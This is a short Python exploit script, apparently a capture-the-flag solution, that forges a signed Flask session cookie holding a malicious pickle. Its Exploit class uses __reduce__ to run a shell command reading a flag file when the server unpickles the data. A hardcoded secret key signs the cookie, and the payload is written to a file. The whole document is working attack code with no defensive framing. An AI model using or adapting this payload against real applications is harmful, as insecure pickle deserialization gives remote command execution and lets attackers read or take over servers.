import os
import base64
import pickle
import requests

from flask_session import encodeFlaskCookie, decodeFlaskCookie


class Exploit(object):
    def __reduce__(self):
        import subprocess
        return (subprocess.getoutput, ('cat /home/web/flag', ))


# data = pickle.dumps(Exploit())
data = [{"date": "2020-05-2511:43:15", "text": Exploit(), "title": "exploit"}]

secret_key = b'\xe1\xb2\xffz\x88*$\x9eWu]B+\xf5\x905'


enc_data = base64.b64encode(pickle.dumps(data))
session_dict = {b'savedata': enc_data}
payload = encodeFlaskCookie(secret_key, session_dict)

with open('payload.txt', 'wb') as f:
    f.write(payload)
